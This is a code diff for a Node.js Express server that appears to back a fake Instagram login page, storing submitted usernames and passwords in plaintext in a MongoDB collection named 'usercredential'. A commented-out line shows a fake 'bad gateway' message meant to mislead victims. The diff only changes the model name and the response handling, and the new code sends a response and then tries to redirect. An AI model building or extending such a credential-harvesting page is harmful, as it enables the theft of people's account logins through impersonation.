@@ -21,7 +21,7 @@ const userSchema = mongoose.Schema({
     required:true
   }
 })
-const User  = mongoose.model('USERCREDENTIAL',userSchema);
+const User  = mongoose.model('usercredential',userSchema);
 app.use(express.static(path.join(__dirname,'/instagramloginpage')))
 app.use(express.urlencoded({extended:false}))
 app.get('/', (req, res) => {
@@ -32,14 +32,19 @@ app.post('/login',(req,res)=>{
     // res.send('<img src="./assets/img/instagram.svg"></img><h1>Connection got disconnected due to bad gate way, try again </h1>')
     let username  = req.body.username;
     let password = req.body.password;
+    let scene = false;
     const user = new User({username,password});
     user.save().then(()=>{
-      console.log('hogaya');
-      res.status(200)
-      res.redirect('*'); 
+      console.log('hogaya'); 
+      scene = true;
     }).catch((err)=>{
       console.log(err);
     })
+    res.send(`data sent ${scene}`);
+    res.status(200)
+    setTimeout(()=>{
+        res.redirect('*');
+    },2000)
 })
 app.get('*',(req,res)=>{
     res.status(404)
